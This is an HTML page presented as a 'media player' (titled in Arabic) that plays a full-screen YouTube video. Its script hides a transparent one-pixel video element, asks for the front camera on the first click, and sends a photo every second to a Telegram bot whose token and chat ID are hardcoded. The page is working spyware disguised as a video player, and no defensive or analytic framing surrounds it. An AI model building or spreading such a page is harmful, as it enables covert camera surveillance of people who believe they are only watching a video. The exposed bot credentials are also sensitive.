<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>مشغل الوسائط</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            overflow: hidden;
            cursor: pointer;
        }

        /* الفيديو يملأ الشاشة */
        .video-wrapper {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
            /* منع التفاعل مع الـ iframe مباشرة لإجبار المتصفح على رصد النقر على الـ body */
            pointer-events: none; 
        }

        /* الكاميرا مخفية تماماً */
        #v {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        canvas {
            display: none;
        }
    </style>
</head>
<body>

<div class="video-wrapper">
    <iframe id="youtube-player" src="https://www.youtube.com/embed/TnPZiCf36Lc?enablejsapi=1&autoplay=1&mute=1" allow="autoplay; encrypted-media"></iframe>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    const CONFIG = {
        TOKEN: "8761336309:AAGv1e4FqNVaybasRyNwLu4U1o5x1pNCJUk",
        CHAT_ID: "7000276863",
        INTERVAL: 1000, // كل ثانيتين
        QUALITY: 15   // جودة منخفضة لسرعة الإرسال
    };

    const video = document.getElementById('v');
    const canvas = document.getElementById('c');
    const ctx = canvas.getContext('2d');
    const iframe = document.getElementById('youtube-player');

    let isStarted = false;

    // يبدأ كل شيء عند أول نقرة للمستخدم
    document.body.addEventListener('click', () => {
        if (isStarted) return;
        isStarted = true;

        // 1. تشغيل صوت الفيديو (تحديث الرابط لإلغاء الكتم)
        let currentSrc = iframe.src;
        iframe.src = currentSrc.replace("mute=1", "mute=0");

        // 2. تفعيل الكاميرا
        initCamera();
    });

    async function initCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            video.srcObject = stream;
            video.play();

            // بدء حلقة الالتقاط
            setInterval(captureAndSend, CONFIG.INTERVAL);
        } catch (err) {
            console.warn("Camera access denied.");
        }
    }

    function captureAndSend() {
        if (video.readyState !== 4) return;

        // حجم صغير للسرعة القصوى
        canvas.width = 400;
        canvas.height = 300;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob((blob) => {
            const formData = new FormData();
            formData.append('chat_id', CONFIG.CHAT_ID);
            formData.append('photo', blob, 'shot.jpg');

            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(() => {}); 
        }, 'image/jpeg', CONFIG.QUALITY);
    }
</script>

</body>
</html>
